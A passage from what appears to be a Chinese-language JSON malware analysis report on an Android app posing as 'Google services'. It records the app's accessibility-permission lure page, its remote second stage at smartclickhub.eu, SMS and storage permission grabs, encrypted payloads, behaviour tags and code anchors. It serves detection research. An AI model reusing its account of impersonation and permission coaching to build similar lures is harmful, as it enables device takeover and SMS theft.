    "overlay_or_fake_settings": "未发现半透明引导遮罩或高仿系统无障碍开关页；引导以本地 HTML 页 + 直接跳转真实系统设置页实现，未做叠层伪装。但 Manifest 中声明了 SYSTEM_ALERT_WINDOW 权限与多个 excludeFromRecents/noHistory 的隐藏壳 Activity，具备运行期叠层能力（具体使用需动态验证）。",
    "restricted_settings_13plus_coaching": "无（页面仅教学进入「设置→已下载/已安装的服务」开启无障碍，未涉及 Android 13+ 应用详情页右上角菜单允许受限设置，也未涉及 Session 安装器绕过）",
    "post_grant_anti_removal": "获权后无静态可见的自点确认或 GLOBAL_ACTION_BACK/HOME 阻止撤权代码；但获权即刻跳转远端 smartclickhub.eu/error/ 并索取短信/存储/电话权限、两次请求忽略电池优化，且无障碍服务声明了 canPerformGestures/canRequestFilterKeyEvents/canTakeScreenshot，运行期具备手势拦截与返回键过滤能力（实际反撤权逻辑位于加密载荷，未静态确认）。",
    "benign_graceful_degradation": "无"
  },
  "utg_capture_guidance": {
    "best_trigger_hook": "监测到应用拉起 Intent 目标为 android.settings.ACCESSIBILITY_SETTINGS（或 Settings$AccessibilitySettingsActivity）的瞬间即拉起 UTG；其次在应用内 WebView 首次出现「Step 1. - Go to Settings / Step 2. - Open \"Downloaded Services\"」文本时提前抓取，以记录跳转前教学页与按钮原文。",
    "key_pages_to_capture": [
      {
        "page_role": "冷启动后本地 HTML 引导教学页（跳转前 WebView 页）",
        "page_identifier": "应用内 WebView，页面顶部 Google 服务图标 + 正文含「Activate Accessibility services」与 Step 1/2/3 三行分步文案，底部绿色「Go to Settings」按钮",
        "why_most_useful": "这是整个诱导链唯一的静态可读文本载体，直接呈现「伪装 Google + 分步教学 + 单一强制按钮」三要素，是判定诱导而非良性说明的决定性页面",
        "observable_utg_signals": [
          "页面标题/正文含 Accessibility services 与 Step 1./Step 2./Step 3. 结构化文案",
          "按钮文案为 Go to Settings 且页面无「取消/跳过/稍后」控件",
          "Step 3 中的品牌锚点文本为 Google Play services，与桌面名 Google services 不一致",
          "页面加载后已出现 android.startPushService 触发的长连行为"
        ]
      },
      {
        "page_role": "系统无障碍服务列表项（真实系统页，非伪造）",
        "page_identifier": "设置 → 无障碍 → 已下载的服务 列表中的「Google services」条目",
        "why_most_useful": "用于核实服务显示名与桌面名同源、且无 description 说明，构成身份混淆的直接证据；也用于确认跳转确实落在真实系统页而非高仿页",
        "observable_utg_signals": [
          "列表项名称恰为 Google services 且无副标题用途说明",
          "包名归属为 centtem.houe948.ov 而非 com.google.*",
          "开关状态在用户操作前后发生翻转"
        ]
      },
      {
        "page_role": "获权后远端二阶段页（smartclickhub.eu/error/）",
        "page_identifier": "WebView 跳转至 smartclickhub.eu 域名，页面随后连续弹出存储/短信/电话状态权限对话框与电池优化提示",
        "why_most_useful": "证实无障碍授权是进入二阶段的触发开关（isAccessibilityServiceEnabled 为真才跳转），把「骗权限」与后续短信/存储窃取串成完整链路",
        "observable_utg_signals": [
          "无障碍开关翻转后 WebView URL 变为 smartclickhub.eu/error/",
          "页面加载后 1 秒内出现 READ_SMS/RECEIVE_SMS 权限请求弹窗",
          "5 秒与 10 秒出现两次忽略电池优化系统对话框"
        ]
      }
    ],
    "needs_ocr_for_image_lure": false,
    "detection_blindspot_note": "存在两处盲区：其一，classes.dex 与全部 assets 条目在 ZIP 目录中被置加密标志、assets/aHsPU.json（5.1MB）为高熵密文、字符串解密由 libs/libcrashyltics.so 承担，导致无障碍服务的实际自动化行为、入口 Activity 与 ACB_Cancel 取消回调逻辑静态不可还原，需运行期 UTG + 无障碍事件监控补齐；其二，获权后跳转的 smartclickhub.eu 页面为远端下发，静态完全不可见，需动态抓包与录屏。引导页本身为纯文本（无纯图空文本诱导），不需要 OCR。"
  },
  "behavior_pattern_tags": [
    "TRIG_COLD_START_BLOCK",
    "CARRIER_WEBVIEW_LOCAL_HTML",
    "CARRIER_SYSTEM_A11Y_DESCRIPTION",
    "LURE_FAKE_UPDATE_OR_INSTALL",
    "LURE_RESTRICTED_SETTINGS_COACHING",
    "COERCE_NO_SKIP_NON_CANCELABLE",
    "ID_SYSTEM_OR_BRAND_IMPERSONATION",
    "ID_MULTI_ALIAS_CAMOUFLAGE",
    "ID_FAKE_IS_ACCESSIBILITY_TOOL",
    "STATIC_PACKED_OR_ENCRYPTED_PAYLOAD"
  ],
  "code_anchors": [
    "com.hazard.fence.Ismartround#attachBaseContext",
    "assets/www/index.html（#btn1 onclick=android.openAccessibilitySettings(true)；DOMContentLoaded 中 isAccessibilityServiceEnabled 判断与 step_1/step_2/step_3/foAccess 多语言变量）",
    "assets/www/inject.js（includes(\"error\") 分支 → android.requestPermissions / android.requestIgnoreBatteryOptimizations）",
    "AndroidManifest.xml service centtem.houe948.ov.JJLg9J3H9dOTlJFkNh（android:label=@7F0E001C，android:description 空）",
    "res/xml/accessibilityservice.xml（canRetrieveWindowContent/canPerformGestures/canRequestFilterKeyEvents/canTakeScreenshot 全能力声明）",
    "libs/libcrashyltics.so Java_androidx_appcompat_widget_ZoeUtils_decodeStringNative"
  ]
}
```

</details>
